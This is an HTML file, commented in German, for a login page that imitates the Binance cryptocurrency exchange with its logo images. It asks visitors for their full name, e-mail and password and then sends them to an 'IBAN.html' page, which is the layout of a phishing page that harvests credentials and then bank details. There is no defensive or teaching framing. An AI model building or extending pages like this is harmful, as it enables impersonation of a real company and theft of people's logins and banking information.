<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #181A20;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            padding: 40px 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .top-left-logo {
            position: absolute;
            top: 20px; /* Abstand vom oberen Rand */
            left: 20px; /* Abstand vom linken Rand */
            display: flex;
            justify-content: center; /* Zentrierung horizontal */
            align-items: center;   /* Zentrierung vertikal */
        }
        .top-left-logo img {
            width: 150px; /* Beispielgröße */
            height: auto;
        }
        .logo {
            width: 50px;
            height: 50px;
            margin-right: 10px;
        }
        .login-header h2 {
            color: #333333;
            font-size: 24px;
            margin: 0;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-container label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            width: 100%;
            text-align: left;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: calc(100% - 20px); /* Gleiche Breite für alle Felder */
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #cccccc;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #ffd700;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-container button:hover {
            background-color: #e6c200;
        }
        .button {
            display: inline-block;
            width: 100%;
            padding: 12px;
            background-color: #ffd700;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            text-decoration: none; /* Entferne die Unterstreichung */
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
        }
        .button:hover {
            background-color: #e6c200;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img src="Binance.png" alt="Logo" class="logo">
            <h2>Login</h2>
        </div>
        <div class="top-left-logo">
            <img src="Binance_Logo.png" alt="Binance Logo">
        </div>
        <!-- Formular zur neuen Seite -->
        <form action="IBAN.html" method="post">
            <label for="name">Full Name</label>
            <input type="text" id="name" name="name" required>

            <label for="email">E-Mail</label>
            <input type="text" id="email" name="email" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>

            <!-- Button zum Zugriff auf die IBAN-Seite -->
            <a href="IBAN.html" class="button">Submit</a>
        </form>
    </div>
</body>
</html>
